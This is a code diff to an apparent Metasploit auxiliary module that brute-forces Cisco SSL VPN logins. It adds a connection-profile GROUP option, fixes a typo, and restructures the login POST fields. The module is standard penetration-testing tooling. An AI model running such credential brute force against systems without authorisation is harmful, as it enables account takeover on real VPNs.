@@ -42,6 +42,7 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
+        OptString.new('GROUP', [true, 'The connection profile to log in to (blank by default)', '']),
         OptPath.new('USERPASS_FILE', [
           false, 'File containing users and passwords separated by space, one pair per line',
           File.join(Msf::Config.data_directory, 'wordlists', 'http_default_userpass.txt')
@@ -63,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi('uri' => normalize_uri('/+CSCOE+/logon.html'))
     return unless res && res.code == 200 && res.get_cookies.include?('webvpn')
 
-    print_status('The remote target appears to host Cisco SSL VPN Service. The moodule will continue.')
+    print_status('The remote target appears to host Cisco SSL VPN Service. The module will continue.')
     print_status('Starting login brute force...')
 
     each_user_pass do |user, pass|
@@ -101,19 +102,27 @@ class MetasploitModule < Msf::Auxiliary
   # Brute-force the login page
   def do_login(user, pass)
     vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect}")
+
+    vars_hash = {
+      'tgroup' => '',
+      'next' => '',
+      'tgcookieset' => '',
+      'username' => user,
+      'password' => pass,
+      'Login' => 'Login'
+    }
+
+    # only add the group if the user specifies a non-empty value
+    unless datastore['GROUP'].nil? || datastore['GROUP'].empty?
+      vars_hash['group_list'] = datastore['GROUP']
+    end
+
     res = send_request_cgi({
       'uri' => normalize_uri('/+webvpn+/index.html'),
       'method' => 'POST',
       'ctype' => 'application/x-www-form-urlencoded',
       'cookie' => 'webvpnlogin=1',
-      'vars_post' => {
-        'tgroup' => '',
-        'next' => '',
-        'tgcookieset' => '',
-        'username' => user,
-        'password' => pass,
-        'Login' => 'Login'
-      }
+      'vars_post' => vars_hash
     })
 
     # check if the user was likely forwarded to the clientless vpn page
